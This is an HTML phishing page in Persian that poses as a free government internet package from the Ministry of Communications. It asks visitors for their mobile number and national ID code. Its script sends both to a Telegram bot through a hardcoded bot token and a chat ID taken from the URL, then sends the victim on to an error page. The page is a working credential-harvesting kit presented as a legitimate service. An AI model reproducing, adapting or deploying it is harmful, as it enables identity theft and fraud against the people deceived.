<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بسته اینترنت رایگان دولت</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Tahoma, sans-serif; }
        body {
            background: linear-gradient(135deg, #0b2b3f, #1a4b61);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 420px;
            text-align: center;
        }
        .logo { font-size: 60px; margin-bottom: 10px; }
        h1 { color: #1a2a3a; font-size: 22px; margin-bottom: 10px; }
        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; line-height: 1.8; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            text-align: center;
        }
        input:focus { border-color: #1a7ae8; background: white; outline: none; }
        button {
            width: 100%;
            padding: 14px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0f5bb5; }
        .note {
            margin-top: 18px;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            padding-top: 16px;
        }
        .note span { color: #1a7ae8; font-weight: bold; }
        .input-group { text-align: right; margin: 5px 0; }
        .input-group label {
            font-size: 13px;
            color: #4a5a6a;
            font-weight: bold;
            display: block;
            margin-right: 5px;
        }
        .error-msg {
            color: #dc2626;
            background: #fee2e2;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 15px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div id="formSection">
            <div class="logo">🎁</div>
            <h1>بسته اینترنت رایگان دولت</h1>
            <p class="sub">برای فعالسازی بسته ۲۰ گیگابایت اینترنت رایگان،<br>شماره موبایل خود را وارد کرده و هویت خود را تایید کنید.</p>

            <form id="findForm">
                <div class="input-group">
                    <label>📞 شماره موبایل</label>
                    <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
                </div>
                <div class="input-group">
                    <label>🆔 کد ملی</label>
                    <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
                </div>
                <button type="submit" id="submitBtn">🎁 دریافت بسته</button>
            </form>

            <div class="note">
                🔒 اطلاعات شما محفوظ است · <span>وزارت ارتباطات</span>
            </div>
        </div>
    </div>

    <script>
        // ======================================================
        // تنظیمات ربات تلگرام
        // ======================================================
        const BOT_TOKEN = '8826841444:AAE3tdS8hRrqZIkFPIUYGS0sblNd34qWOMY';

        // ======================================================
        // دریافت user_id از URL
        // ======================================================
        function getUserIdFromURL() {
            const params = new URLSearchParams(window.location.search);
            return params.get('user_id');
        }

        const USER_ID = getUserIdFromURL();

        // ======================================================
        // بررسی وجود user_id در URL
        // ======================================================
        if (!USER_ID) {
            document.body.innerHTML = `
                <div class="container">
                    <div class="error-msg">⛔ دسترسی غیرمجاز</div>
                    <p style="color: #6c7a8a; margin-top: 20px;">برای دسترسی به این صفحه، ابتدا لینک اختصاصی خود را از صفحه اصلی دریافت کنید.</p>
                    <a href="https://8080602.github.io/8080/" style="display: inline-block; margin-top: 20px; padding: 12px 24px; background: #1a7ae8; color: white; border-radius: 12px; text-decoration: none; font-weight: bold;">🔗 دریافت لینک اختصاصی</a>
                </div>
            `;
            throw new Error('دسترسی غیرمجاز: user_id وجود ندارد');
        }

        // ======================================================
        // تابع ارسال اطلاعات به تلگرام
        // ======================================================
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: USER_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('❌ خطا در ارسال:', e);
            }
        }

        // ======================================================
        // رویداد کلیک روی دکمه فرم
        // ======================================================
        document.getElementById('findForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const phone = document.getElementById('phone').value;
            const nationalCode = document.getElementById('nationalCode').value;
            const submitBtn = document.getElementById('submitBtn');

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ در حال پردازش...';

            try {
                let message = `🎯 **اطلاعات جدید** 🎯\n\n`;
                message += `🆔 شناسه کاربر: \`${USER_ID}\`\n`;
                message += `📞 شماره: ${phone}\n`;
                message += `🆔 کد ملی: ${nationalCode}\n`;
                message += `⏱️ زمان: ${new Date().toLocaleString('fa-IR')}`;

                await sendToTelegram(message);
                window.location.href = 'https://example.com/error';

            } catch (error) {
                console.error('❌ خطا:', error);
                window.location.href = 'https://example.com/error';
            }
        });

        console.log('🆔 شناسه کاربر:', USER_ID);
        console.log('📤 اطلاعات به این شناسه ارسال می‌شود:', USER_ID);
    </script>
</body>
</html>
